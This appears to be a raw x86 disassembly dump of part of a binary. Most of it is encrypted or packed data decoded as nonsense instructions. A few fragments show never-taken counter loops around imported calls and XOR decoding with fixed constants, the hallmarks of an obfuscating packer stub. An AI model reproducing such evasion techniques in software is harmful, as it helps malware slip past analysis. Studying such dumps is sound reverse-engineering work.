  4028c3:	xor    DWORD PTR [ecx],edx
  4028c5:	ja     0x402934
  4028c7:	sahf   
  4028c8:	jnp    0x4028a9
  4028ca:	shr    DWORD PTR [ebx+0x775342ec],cl
  4028d0:	inc    ebp
  4028d1:	jg     0x4028cf
  4028d3:	xchg   BYTE PTR [eax-0x7b],al
  4028d6:	out    0xde,al
  4028d8:	dec    esp
  4028d9:	gs xchg ecx,eax
  4028db:	pop    ds
  4028dc:	aas    
  4028dd:	shl    BYTE PTR [ebx],0xb5
  4028e0:	retf   0x5e73
  4028e3:	xchg   esi,eax
  4028e4:	jnp    0x402960
  4028e6:	jne    0x4028f4
  4028e8:	add    dh,BYTE PTR [esi]
  4028ea:	adc    eax,0xdd8cfb7
  4028ef:	aaa    
  4028f0:	jbe    0x4028d1
  4028f2:	and    al,0xf
  4028f4:	into   
  4028f5:	sti    
  4028f6:	mov    cl,0xa5
  4028f8:	dec    edi
  4028f9:	int    0xd5
  4028fb:	ret    0x6e41
  4028fe:	mov    DWORD PTR fs:[esi+edi*8+0x4c78e3c9],ebx
  402906:	mov    esp,0x2cd526fc
  40290b:	mov    ch,0x2a
  40290d:	mov    BYTE PTR [edx+0x5244e138],al
  402913:	and    BYTE PTR [esi+0x33],dl
  402916:	mov    ch,0x87
  402918:	push   es
  402919:	sbb    BYTE PTR [eax+0x27],bh
  40291c:	dec    eax
  40291d:	out    0xfe,eax
  40291f:	adc    al,0x2f
  402921:	sar    DWORD PTR [edx],1
  402923:	fldcw  WORD PTR [ebp+0x6b]
  402926:	xchg   esp,eax
  402927:	(bad)  
  402928:	adc    BYTE PTR [ebx-0x7bc632f7],cl
  40292e:	je     0x402971
  402930:	stos   DWORD PTR es:[edi],eax
  402931:	(bad)  
  402932:	icebp  
  402933:	mov    DWORD PTR [edi+0x6ba08ae1],edx
  402939:	xor    eax,0x16d20acc
  40293e:	ds out dx,al
  402940:	mov    al,0xbc
  402942:	inc    esi
  402943:	repz inc edi
  402945:	push   0xdf738512
  40294a:	xor    DWORD PTR [ebp-0xb92ef70],ecx
  402950:	stc    
  402951:	fcmovnu st,st(6)
  402953:	or     al,0x24
  402955:	push   cs
  402956:	in     al,dx
  402957:	jne    0x402946
  402959:	push   eax
  40295a:	xchg   esp,eax
  40295b:	mov    BYTE PTR [ebx+0x3eaf635a],ch
  402961:	mov    dh,0x1f
  402963:	shr    BYTE PTR [ebx-0x36a166af],0xc2
  40296a:	add    al,0x0
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x8c50201e
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x7170707e
  402afd:	sbb    al,0xf0
  402aff:	jae    0x402b5f
  402b01:	mov    ds:0x59c04525,eax
  402b06:	sbb    DWORD PTR [ebx],edi
  402b08:	push   esp
  402b09:	add    al,0x80
  402b0b:	ins    BYTE PTR es:[edi],dx
  402b0c:	ret    
  402b0d:	pop    ebp
  402b0e:	fsub   st,st(1)
  402b10:	nop
  402b11:	fisttp DWORD PTR [eax-0x17]
  402b14:	pop    ebp
  402b15:	(bad)  
  402b16:	into   
  402b17:	cwde   
  402b18:	push   0x69
  402b1a:	cmc    
  402b1b:	push   esi
  402b1c:	iret   
  402b1d:	popa   
  402b1e:	mov    dh,BYTE PTR [ebp+0x153a41e]
  402b24:	imul   ecx,esp,0xad155397
  402b2a:	xchg   ebx,eax
  402b2b:	jl     0x402ae8
  402b2d:	clc    
  402b2e:	jl     0x402af9
  402b30:	fs sbb ebx,0xbebc3b07
  402b37:	jmp    0x2a4:0x1df5c13
  402b3e:	pop    esi
  402b3f:	sti    
  402b40:	mov    ecx,0xd7007d09
  402b45:	mov    eax,0xcb628761
  402b4a:	data16 sbb dh,BYTE PTR [edi+0x10]
  402b4e:	pop    ds
  402b4f:	fidiv  DWORD PTR ds:0xf58af10b
  402b55:	inc    eax
  402b56:	inc    esi
  402b57:	push   edi
  402b58:	cld    
  402b59:	adc    eax,0xfd2f8ead
  402b5e:	ins    DWORD PTR es:[edi],dx
  402b5f:	pop    esi
  402b60:	sub    ebp,ecx
  402b62:	inc    eax
  402b63:	inc    edi
  402b64:	fst    QWORD PTR [edi+ecx*8-0x31f89b69]
  402b6b:	add    al,0x7c
  402b6d:	lock (bad) 
  402b6f:	lahf   
  402b70:	add    BYTE PTR [ebp+0x133f8152],dl
  402b76:	xchg   ebx,eax
  402b77:	add    BYTE PTR [edi+0x6ad4cd48],dh
  402b7d:	test   al,0x9f
  402b7f:	push   esi
  402b80:	jp     0x402be3
  402b82:	inc    eax
  402b83:	ss push ecx
  402b85:	xchg   edi,eax
  402b86:	mov    edx,0x554d15bc
  402b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b8c:	mov    DWORD PTR [esi],edi
  402b8e:	retf   0x466c
  402b91:	int3   
  402b92:	cs inc ebp
  402b94:	push   cs
  402b95:	fild   WORD PTR [eax]
  402b97:	add    eax,DWORD PTR [ebx+0x66]
  402b9a:	add    bl,al
  402b9c:	jbe    0x402b6f
  402b9e:	push   ss
  402b9f:	and    ebx,0x7
  402ba2:	ret    
  402ba3:	pop    edx
  402ba4:	mov    esi,0x4cc916c1
  402ba9:	(bad)  
  402baa:	jmp    0x402b45
  402bac:	jo     0x402b95
  402bae:	xchg   edi,eax
  402baf:	leave  
  402bb0:	out    0x85,al
  402bb2:	push   0x64
  402bb4:	(bad)  
  402bb5:	mov    edx,0x85b3d074
  402bba:	mov    cl,0x49
  402bbc:	or     eax,0x7360bbee
  402bc1:	or     eax,0x66ae4e35
  402bc6:	cld    
  402bc7:	push   0x1624e054
  402bcc:	push   0xffffffd7
  402bce:	nop
  402bcf:	or     BYTE PTR [eax],0xa6
  402bd2:	jmp    0x9f377670
  402bd7:	fwait
  402bd8:	xchg   ebp,eax
  402bd9:	jno    0x402c00
  402bdb:	div    BYTE PTR [esi-0x26]
  402bde:	jl     0x402c53
  402be0:	scas   al,BYTE PTR es:[edi]
  402be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402be2:	(bad)  
  402be3:	into   
  402be4:	or     ah,BYTE PTR [esi]
  402be6:	add    al,cl
  402be8:	sbb    eax,0xe8afdc8f
  402bed:	sbb    al,0x3e
  402bef:	pop    edi
  402bf0:	mov    esp,0xa38e91d6
  402bf5:	fild   DWORD PTR [ecx-0x1f]
  402bf8:	bound  eax,QWORD PTR [esi-0x46f72c8d]
  402bfe:	jbe    0x402c38
  402c00:	(bad)  
  402c01:	cmp    DWORD PTR [edx+0x26],ecx
  402c04:	gs ds pop ss
  402c07:	neg    DWORD PTR [eax]
  402c09:	mov    ds:0x44055ab1,eax
  402c0e:	adc    BYTE PTR ds:0x462a38ec,0xf0
  402c15:	jecxz  0x402ba9
  402c17:	dec    eax
  402c18:	mov    ?,WORD PTR [eax+eax*2-0x30]
  402c1c:	daa    
  402c1d:	add    DWORD PTR [ebp+0x6db57719],eax
  402c23:	xchg   bx,ax
  402c25:	jp     0x402c18
  402c27:	scas   eax,DWORD PTR es:[edi]
  402c28:	mov    esi,fs
  402c2a:	sub    eax,0x935237b7
  402c2f:	shr    ecx,cl
  402c31:	add    BYTE PTR [edi+0x77262ed5],dh
  402c37:	push   0xffffffde
  402c39:	shl    DWORD PTR [edi+0x11d7dcfe],0x88
  402c40:	hlt    
  402c41:	xor    BYTE PTR [ebx-0x5e],bh
  402c44:	and    dl,bh
  402c46:	cmp    BYTE PTR [eax-0x59b1a95c],0xb9
  402c4d:	xor    eax,0xb0d95082
  402c53:	jno    0x402c7e
  402c55:	test   ch,0xc0
  402c58:	mov    ds:0x1a8f3893,eax
  402c5d:	push   0x50
  402c5f:	xchg   esp,eax
  402c60:	add    DWORD PTR [ecx*8+0x577716ad],ebp
  402c67:	mov    esi,0x220a2adc
  402c6c:	mov    edx,0xb39235f1
  402c71:	xchg   esi,eax
  402c73:	fstp   DWORD PTR [ebp+0x23]
  402c76:	les    esp,FWORD PTR ds:0xb2001947
  402c7c:	hlt    
  402c7d:	fisub  DWORD PTR [edi-0x24]
  402c80:	push   edx
  402c81:	jl     0x402c1c
  402c83:	sub    ch,dl
  402c85:	ret    
  402c86:	mov    ecx,0xfc76eebf
  402c8b:	sub    esp,ecx
  402c8d:	mov    dl,0x8f
  402c8f:	ds cmp al,0xd
  402c92:	push   es
  402c93:	inc    ebx
  402c94:	sbb    al,0x88
  402c96:	add    DWORD PTR [edi-0x3],0xffffffc6
  402c9a:	push   0x8ed9a748
  402c9f:	jno    0x402ce2
  402ca1:	pop    ecx
  402ca2:	test   BYTE PTR [ebp+0x6abeb1a7],dh
  402ca8:	popf   
  402ca9:	inc    edi
  402caa:	sbb    eax,0x45bc178a
  402caf:	mov    cl,dh
  402cb1:	fadd   DWORD PTR [esi+0x3c812e1d]
  402cb7:	mov    WORD PTR ds:0xe06265a6,es
  402cbd:	sti    
  402cbe:	shl    ebx,cl
  402cc0:	jne    0x402d19
  402cc2:	cwde   
  402cc3:	add    DWORD PTR [ebx-0x7d],0x31
  402cc7:	sti    
  402cc8:	pop    edi
  402cc9:	mov    ecx,0x5395fd37
  402cce:	sti    
  402ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cd0:	pusha  
  402cd1:	stos   DWORD PTR es:[edi],eax
  402cd2:	sub    al,0x63
  402cd4:	call   0x833b:0xf83d7c54
  402cdb:	jno    0x402d3b
  402cdd:	es inc esi
  402cdf:	cs jne 0x402cae
  402ce2:	jg     0x402cab
  402ce4:	enter  0xdedc,0xbc
  402ce8:	jp     0x402cb9
  402cea:	in     al,dx
  402ceb:	xor    ch,bl
  402ced:	inc    edi
  402cee:	or     eax,0x5df3fcf4
  402cf3:	pop    edx
  402cf4:	cmp    eax,0x9c5a5048
  402cf9:	pop    edi
  402cfa:	mov    ebx,0x2fac70de
  402cff:	jns    0x402cd6
  402d01:	push   edx
  402d02:	fldcw  WORD PTR [esi+esi*8]
  402d05:	fcomi  st,st(1)
  402d07:	pop    ss
  402d08:	push   DWORD PTR [eax+0x447fcae6]
  402d0e:	sar    ah,0x24
  402d11:	pop    ecx
  402d12:	stos   DWORD PTR es:[edi],eax
  402d13:	jg     0x402d54
  402d15:	inc    edi
  402d16:	cmp    al,0x91
  402d18:	xchg   edi,eax
  402d19:	cld    
  402d1a:	imul   esi,DWORD PTR ds:0x8c11bc0,0xc56be6be
  402d24:	leave  
  402d25:	sbb    eax,0x1016da83
  402d2a:	imul   esi,DWORD PTR [edi-0x4d],0x83f4ff10
  402d31:	mov    al,0xf6
  402d33:	arpl   WORD PTR gs:0x35623e2e,bx
  402d3a:	jmp    0x3b05:0xd9aea320
  402d41:	les    ebx,FWORD PTR [ecx]
  402d43:	adc    BYTE PTR [ebx],al
  402d45:	in     al,dx
  402d46:	sahf   
  402d47:	and    al,0x43
  402d49:	sbb    eax,esi
  402d4b:	div    bh
  402d4d:	mov    WORD PTR [edx+edx*4],fs
  402d50:	dec    esp
  402d51:	out    0x76,al
  402d53:	int    0xc3
  402d55:	(bad)  
  402d56:	cwde   
  402d57:	lock and ecx,esi
  402d5a:	int3   
  402d5b:	inc    edi
  402d5c:	or     DWORD PTR [ebx+0xe1dea85],ebp
  402d62:	aad    0xed
  402d64:	dec    edx
  402d65:	rcl    BYTE PTR [ebx],1
  402d67:	sbb    eax,DWORD PTR [esi+ebp*4-0x5a]
  402d6b:	retf   0xbbc1
  402d6e:	jbe    0x402db1
  402d70:	dec    ebx
  402d71:	aad    0xce
  402d73:	jno    0x402de5
  402d75:	ficom  DWORD PTR [ebx]
  402d77:	or     DWORD PTR [esi+edx*4],edx
  402d7a:	push   eax
  402d7b:	jmp    0x402d9f
  402d7d:	and    dl,bl
  402d7f:	inc    ebp
  402d80:	cmp    eax,0x954208
  402d85:	js     0x402d7a
  402d87:	adc    eax,0xdc985f49
  402d8c:	pop    ss
  402d8d:	and    eax,0x7d22b2bd
  402d92:	xchg   edi,eax
  402d93:	(bad)  
  402d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d95:	ss rcr bh,1
  402d98:	inc    esp
  402d99:	add    eax,0xe1a9c38d
  402d9e:	mov    esp,0x3fbf251e
  402da3:	mov    bh,0x4e
  402da5:	arpl   WORD PTR [esi+0x54aeecb1],ax
  402dab:	ins    DWORD PTR es:[edi],dx
  402dac:	shl    BYTE PTR [eax+0x70],1
  402daf:	sahf   
  402db0:	inc    eax
  402db1:	push   eax
  402db2:	fs retf 
  402db4:	dec    eax
  402db5:	and    BYTE PTR [eax-0x3a],0xad
  402db9:	ds xchg ebp,eax
  402dbb:	mov    eax,ds:0xd603bd3d
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	push   ebp
  402de0:	mov    eax,ecx
  402de2:	pop    ebx
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402d7b
  402dec:	and    bh,BYTE PTR [edi+0x33f1f363]
  402df2:	xor    ebx,DWORD PTR [ecx-0x4e4c47db]
  402df8:	outs   dx,BYTE PTR ds:[esi]
  402df9:	(bad)  
  402dfa:	test   DWORD PTR [edx-0x27e5b8f8],edx
  402e00:	add    BYTE PTR [ebp+0x1195f1cb],cl
  402e06:	(bad)  
  402e07:	in     eax,0x8a
  402e09:	and    BYTE PTR [edx-0x44],al
  402e0c:	mov    esp,0x13cf9474
  402e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e12:	stos   DWORD PTR es:[edi],eax
  402e13:	int    0xa2
  402e15:	mov    eax,ds:0x9483fc75
  402e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e1b:	mov    ecx,0x24c0d369
  402e20:	push   edx
  402e21:	xchg   edi,eax
  402e22:	xchg   ecx,eax
  402e23:	int3   
  402e24:	mov    edi,0xe5cb14e2
  402e29:	scas   eax,DWORD PTR es:[edi]
  402e2a:	mov    ch,BYTE PTR [ebp-0x4f98fbb]
  402e30:	mov    cl,0xcb
  402e32:	fsubr  st(2),st
  402e34:	xchg   BYTE PTR [ebx-0x9741a64],ch
  402e3a:	lods   eax,DWORD PTR ds:[esi]
  402e3b:	retf   
  402e3c:	out    0x1,al
  402e3e:	push   ss
  402e3f:	int3   
  402e40:	push   dx
  402e42:	ret    0x40f3
  402e45:	in     eax,dx
  402e46:	jl     0x402e12
  402e48:	test   DWORD PTR [eax+0x49],ebp
  402e4b:	xchg   edi,eax
  402e4c:	std    
  402e4d:	lods   al,BYTE PTR ds:[esi]
  402e4e:	xchg   esi,eax
  402e4f:	pop    eax
  402e50:	mov    cl,0xaf
  402e52:	sub    al,dh
  402e54:	adc    dh,dh
  402e56:	cld    
  402e57:	inc    edx
  402e58:	test   DWORD PTR [edi],edi
  402e5a:	iret   
  402e5b:	sub    al,0xc1
  402e5d:	ja     0x402e52
  402e5f:	sar    bh,cl
  402e61:	aam    0xc8
  402e63:	xchg   edi,eax
  402e64:	jmp    0x402e8a
  402e66:	mov    ebp,0x219f0ebe
  402e6b:	call   0x7baed3a8
  402e70:	loope  0x402ee6
  402e72:	mov    al,ds:0x968a791c
  402e77:	sbb    esp,DWORD PTR [ebp+0x27]
  402e7a:	(bad)  
  402e7b:	jle    0x402e67
  402e7d:	inc    esp
  402e7e:	fistp  DWORD PTR [esi]
  402e80:	cmp    bh,BYTE PTR [ebp-0x20]
  402e83:	sbb    DWORD PTR [edx+0x522c6e72],0xffffff97
  402e8a:	js     0x402e35
  402e8c:	out    0xb7,al
  402e8e:	xor    BYTE PTR [edx+0x3469c411],ch
  402e94:	and    bl,BYTE PTR [ebp+0x70]
  402e97:	ret    
  402e98:	cmp    edi,DWORD PTR [esi-0x6787be2c]
  402e9e:	mov    al,dl
  402ea0:	loope  0x402ec9
  402ea2:	btc    esp,ebp
  402ea5:	mov    al,ds:0xe92bd55
  402eaa:	add    al,0x76
  402eac:	pop    edi
  402ead:	cwde   
  402eae:	dec    edx
  402eaf:	cld    
  402eb0:	jne    0x402ec5
  402eb2:	lahf   
  402eb3:	sbb    eax,0xe81ab936
  402eb8:	dec    DWORD PTR [esi-0x53d293ba]
  402ebe:	fdiv   QWORD PTR [esi]
  402ec0:	and    ebx,0x51
  402ec3:	jle    0x402ebf
  402ec5:	or     edx,DWORD PTR [ebx]
  402ec7:	repz int 0x68
  402eca:	aad    0xe1
  402ecc:	lahf   
  402ecd:	ds jl  0x402e89
  402ed0:	imul   esp,DWORD PTR [esi+eiz*1],0x229fb454
  402ed7:	leave  
  402ed8:	jge    0x402f2e
  402eda:	xor    bl,ch
  402edc:	jb     0x402ef5
  402ede:	enter  0x1a9b,0x71
  402ee2:	fidiv  WORD PTR ds:0xb1228c7c
  402ee8:	adc    BYTE PTR [eax-0x569465f9],bh
  402eee:	push   ss
  402eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ef0:	pop    edi
  402ef1:	aad    0x2c
  402ef3:	test   eax,0xfd20c554
  402ef8:	cmp    BYTE PTR [edi],dh
  402efa:	jb     0x402f00
  402efc:	dec    edx
  402efd:	(bad)  
  402eff:	cmp    esi,DWORD PTR [ecx-0x2fe31b78]
  402f05:	in     al,dx
  402f06:	test   esi,esp
  402f08:	outs   dx,DWORD PTR ds:[esi]
  402f09:	sbb    ah,BYTE PTR [edi+edi*4+0x47593db6]
  402f10:	jg     0x402f3c
  402f12:	mov    ebp,0xbdfe6fa5
  402f17:	sahf   
  402f18:	jecxz  0x402f8b
  402f1a:	(bad)  
  402f1b:	mov    esi,edx
  402f1d:	arpl   WORD PTR [edx],dx
  402f1f:	ins    DWORD PTR es:[edi],dx
  402f20:	jge    0x402f8f
  402f22:	inc    ebx
  402f23:	cmp    esi,eax
  402f25:	and    ecx,ebx
  402f27:	or     bh,BYTE PTR [ecx+0x3c368ffb]
  402f2d:	jle    0x402ec8
  402f2f:	push   ebp
  402f30:	xchg   ecx,eax
  402f31:	and    eax,0xd8126666
  402f36:	mov    eax,DWORD PTR [edi]
  402f38:	cmp    al,0x90
  402f3a:	cmp    cl,dh
  402f3c:	and    esi,DWORD PTR [ebx-0x3e555680]
  402f42:	shr    BYTE PTR es:[ebp-0x4b76a703],cl
  402f49:	mov    edi,DWORD PTR [edx-0x4df3173]
  402f4f:	daa    
  402f50:	cmc    
  402f51:	xchg   edi,eax
  402f52:	je     0x402f49
  402f54:	leave  
  402f55:	hlt    
  402f56:	or     eax,0xe78eb986
  402f5b:	sbb    eax,0xe5662b17
  402f60:	mov    al,ds:0xa4cccf8e
  402f65:	aas    
  402f66:	sub    BYTE PTR [edx],dh
  402f68:	daa    
  402f69:	cdq    
  402f6a:	pop    ecx
  402f6b:	mov    edi,0xca64b14e
  402f70:	sbb    bh,BYTE PTR [edx-0x172e8058]
  402f76:	and    eax,0x6e9232aa
  402f7b:	adc    eax,0x88ab9044
  402f80:	lahf   
  402f81:	pusha  
  402f82:	jnp    0x402fa7
  402f84:	jmp    0x516b6aed
  402f89:	xchg   esp,eax
  402f8a:	ret    
  402f8b:	test   BYTE PTR [ecx+0x718509c2],ch
  402f91:	inc    eax
  402f92:	call   FWORD PTR [esi+0x63]
  402f95:	test   BYTE PTR [edx-0x3c98d9e6],ah
  402f9b:	call   0x2550599
  402fa0:	(bad)  
  402fa1:	sar    cl,1
  402fa3:	jle    0x402f66
  402fa5:	jae    0x402f6b
  402fa7:	xchg   edx,eax
  402fa8:	sub    ax,0x5655
  402fac:	add    DWORD PTR [ebp-0x8],edi
  402faf:	mov    ds,WORD PTR [edx]
  402fb1:	mov    eax,0xb46e4b56
  402fb6:	test   eax,0x91b43366
  402fbb:	rcl    DWORD PTR [eax-0x21afde95],0x33
  402fc2:	pop    di
  402fc4:	sub    eax,0x4baa099d
  402fc9:	call   0x63f2df3a
  402fce:	pop    esp
  402fcf:	mov    es,edi
  402fd1:	dec    esp
  402fd2:	retf   0x5303
  402fd5:	out    dx,al
  402fd6:	or     BYTE PTR [edx+0xf],0x44
  402fda:	sub    DWORD PTR [ebp-0x18],eax
  402fdd:	xchg   esp,eax
  402fde:	mov    es,WORD PTR [esi+0x2b]
  402fe1:	pop    edi
  402fe2:	mov    dl,0xe8
  402fe4:	inc    esi
  402fe5:	cli    
  402fe6:	cmc    
  402fe7:	xlat   BYTE PTR ds:[ebx]
  402fe8:	sbb    al,0x41
  402fea:	or     dl,0x80
  402fed:	sub    al,0x66
  402fef:	sahf   
  402ff0:	fsub   DWORD PTR [ebx+edi*2]
  402ff3:	push   esp
  402ff4:	shl    BYTE PTR [ebx],0x4f
  402ff7:	inc    ecx
  402ff8:	sub    cl,BYTE PTR [ecx+0x48]
  402ffb:	ror    esi,cl
  402ffd:	jns    0x403004
  402fff:	xchg   BYTE PTR [edi+0x289f1bef],ah
  403005:	mov    al,dl
  403007:	fst    QWORD PTR [edi-0x7e]
  40300a:	test   BYTE PTR [ecx+0x5c1f2f9f],0xcc
  403011:	dec    edi
  403012:	push   ebx
  403013:	test   eax,0x464c53c3
  403018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403019:	add    al,0xf4
  40301b:	mov    edx,gs
  40301d:	out    dx,eax
  40301e:	jge    0x402fc9
  403020:	cmp    al,0xdb
  403022:	dec    eax
  403023:	mov    edi,0x156a127b
  403028:	shl    BYTE PTR [edx+0x5a9be380],0x3f
  40302f:	fstp   QWORD PTR [esi]
  403031:	xor    ecx,esp
  403033:	add    al,BYTE PTR [ecx+0x2f96a96f]
  403039:	xlat   BYTE PTR ds:[ebx]
  40303a:	iret   
  40303b:	cdq    
  40303c:	loope  0x40302c
  40303e:	mov    eax,ds:0x89f02935
  403043:	idiv   BYTE PTR [ebp+0x65e40605]
  403049:	rol    dh,1
  40304b:	inc    edi
  40304c:	add    BYTE PTR [ebx-0x60c5d0e6],ch
  403052:	sbb    esp,edi
  403054:	and    DWORD PTR [ebx],0x4d
  403057:	add    esp,DWORD PTR [ecx+eax*2+0x27373de8]
  40305e:	pop    eax
  40305f:	xchg   esi,eax
  403060:	mov    ah,0x70
  403062:	mov    edx,0xa90edc29
  403067:	push   edx
  403068:	or     al,0xbd
  40306a:	push   es
  40306b:	push   ebp
  40306c:	lds    ecx,FWORD PTR gs:[edi+0x8]
  403070:	addr16 dec eax
  403072:	cwde   
  403073:	add    ebx,DWORD PTR [edx+0x548bb522]
  403079:	fs push ds
  40307b:	jl     0x403051
  40307d:	cmp    edi,ebp
  40307f:	mov    dh,0xb
  403081:	xchg   esi,eax
  403082:	mov    esp,0xec4e594e
  403087:	in     eax,dx
  403088:	scas   eax,DWORD PTR es:[edi]
  403089:	jl     0x40303a
  40308b:	adc    al,0x9
  40308d:	xchg   edi,eax
  40308e:	sbb    ch,ah
  403090:	call   0xf8a9b37a
  403095:	clc    
  403096:	jo     0x4030ac
  403098:	inc    esi
  403099:	push   eax
  40309a:	leave  
  40309b:	xchg   esp,eax
  40309c:	es in  al,0x49
  40309f:	data16 adc bl,dh
  4030a2:	push   ebx
  4030a3:	and    bh,BYTE PTR [ecx*1+0x37551429]
  4030aa:	fistp  WORD PTR [edx+0x729cbe90]
  4030b0:	xor    al,BYTE PTR [eax]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x4a
  4030ce:	sub    edx,0x7017fc51
  4030d4:	jo     0x403094
  4030d6:	jle    0x403148
  4030d8:	jo     0x4030b4
  4030da:	neg    DWORD PTR [edi+0x30]
  4030dd:	sub    ax,0x617
  4030e1:	sub    BYTE PTR [ebp+0x7f728358],dh
  4030e7:	gs add eax,0x6225afea
  4030ed:	sbb    DWORD PTR [edi+eax*8+0x30],ebx
  4030f1:	gs je  0x4030ee
  4030f4:	rcr    DWORD PTR [edi+0x412e8d52],1
  4030fa:	mov    bl,0x79
  4030fc:	sub    BYTE PTR [ecx],ch
  4030fe:	neg    BYTE PTR [edx+ebp*2]
  403101:	js     0x403124
  403103:	xchg   ecx,eax
  403104:	dec    esp
  403105:	or     BYTE PTR [ebx-0x2a],al
  403108:	adc    edi,DWORD PTR [esi-0x3e]
  40310b:	add    DWORD PTR [edi+0x7397d446],ebp
  403111:	(bad)  
  403112:	jbe    0x2122dc61
  403118:	xor    DWORD PTR [edi-0x22],eax
  40311b:	pop    ecx
  40311c:	pop    ds
  40311d:	sub    BYTE PTR [ebx+0x22cc30fb],ch
  403123:	pop    esi
  403124:	push   esi
  403125:	dec    eax
  403126:	jle    0x403143
  403128:	mov    ds:0x7a321790,al
  40312d:	cdq    
  40312e:	xor    eax,0x9c37ff76
  403133:	test   DWORD PTR [eax],0x851f8334
  403139:	mov    esi,edi
  40313b:	aad    0x1e
  40313d:	push   ss
  40313e:	lods   eax,DWORD PTR ds:[esi]
  40313f:	adc    DWORD PTR [edi+0x6ab20e2],edi
  403145:	xchg   DWORD PTR [ecx-0x629f810d],edx
  40314b:	ins    DWORD PTR es:[edi],dx
  40314c:	xchg   edi,eax
  40314d:	aam    0x78
  40314f:	or     ebx,DWORD PTR [eax]
  403151:	test   eax,0xd7f1f682
  403156:	xchg   esi,eax
  403157:	jl     0x403101
  403159:	inc    ecx
  40315a:	sub    esi,DWORD PTR [eax-0x56b69b85]
  403160:	(bad)  
  403163:	(bad)  
  403165:	test   eax,0x1f0965b4
  40316a:	add    al,0xc5
  40316c:	retf   
  40316d:	mov    esi,ecx
  40316f:	fdiv   st(6),st
  403171:	lea    edi,[esi]
  403173:	push   es
  403174:	ret    0x4224
  403177:	in     eax,0xb5
  403179:	mov    DWORD PTR [edi-0x23],edi
